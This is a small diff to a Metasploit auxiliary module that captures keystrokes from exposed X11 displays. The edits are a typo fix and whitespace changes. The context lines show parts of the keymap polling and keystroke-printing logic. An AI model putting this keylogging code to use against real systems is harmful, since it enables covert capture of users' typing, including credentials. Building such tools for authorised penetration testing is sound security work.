@@ -73,7 +73,7 @@ class MetasploitModule < Msf::Auxiliary
     begin
       connection = X11CONNECTION.read(packet)
     rescue EOFError
-      vprint_bad("Connection packet malfored (size: #{packet.length}), attempting to get read more data")
+      vprint_bad("Connection packet malformed (size: #{packet.length}), attempting to get read more data")
       packet += sock.get_once(-1, 1)
       begin
         connection = X11CONNECTION.read(packet)
@@ -137,6 +137,7 @@ class MetasploitModule < Msf::Auxiliary
     # Iterate through each byte of keyboard state
     bit_array_of_keystrokes.each_with_index do |keyboard_state_byte, byte_index|
       next if last_key_press_array[byte_index] == keyboard_state_byte
+
       # Check each bit within the byte
       8.times do |j|
         next unless keyboard_state_byte & (1 << j) != 0
@@ -235,7 +236,7 @@ class MetasploitModule < Msf::Auxiliary
         bit_array_of_keystrokes = QUERYKEYMAPREPLY.read(sock.get_once(-1, 1)).data
         # we poll FAR quicker than a normal key press, so we need to filter repeats
         next if bit_array_of_keystrokes == last_key_press_array # skip repeats
-        
+
         print_keystroke(bit_array_of_keystrokes, key_map, last_key_press_array) unless bit_array_of_keystrokes == empty
         last_key_press_array = bit_array_of_keystrokes
       end
